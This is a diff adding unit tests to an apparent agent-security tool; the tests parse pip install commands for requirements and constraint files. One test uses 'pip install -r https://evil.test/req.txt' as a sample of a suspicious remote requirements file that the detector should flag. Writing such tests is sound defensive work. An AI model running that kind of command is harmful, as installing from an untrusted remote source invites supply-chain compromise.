@@ -153,6 +153,42 @@ def test_hermes_parse_cargo_for_guard() -> None:
     assert ("serde", Ecosystem.CARGO) in pkgs
 
 
+# ── _parse_shell_manifests (-r / -c requirements files) ──────────────────────
+
+
+def test_parse_shell_manifests_requirement_flag() -> None:
+    from agentshield.integrations.hermes.plugin import _parse_shell_manifests
+
+    paths, suspicions = _parse_shell_manifests("pip install -r requirements.txt")
+    assert paths == ["requirements.txt"]
+    assert suspicions == []
+
+
+def test_parse_shell_manifests_long_and_equals_forms() -> None:
+    from agentshield.integrations.hermes.plugin import _parse_shell_manifests
+
+    paths, _ = _parse_shell_manifests("pip install --requirement dev.txt")
+    assert paths == ["dev.txt"]
+    paths, _ = _parse_shell_manifests("pip install --constraint=constraints.txt")
+    assert paths == ["constraints.txt"]
+
+
+def test_parse_shell_manifests_remote_is_suspicious() -> None:
+    from agentshield.integrations.hermes.plugin import _parse_shell_manifests
+
+    paths, suspicions = _parse_shell_manifests("pip install -r https://evil.test/req.txt")
+    assert paths == []
+    assert any("remote requirements file" in s for s in suspicions)
+
+
+def test_parse_shell_manifests_ignores_named_packages() -> None:
+    from agentshield.integrations.hermes.plugin import _parse_shell_manifests
+
+    paths, suspicions = _parse_shell_manifests("pip install requests flask")
+    assert paths == []
+    assert suspicions == []
+
+
 # ── _write_temp_script ────────────────────────────────────────────────────────
 
 
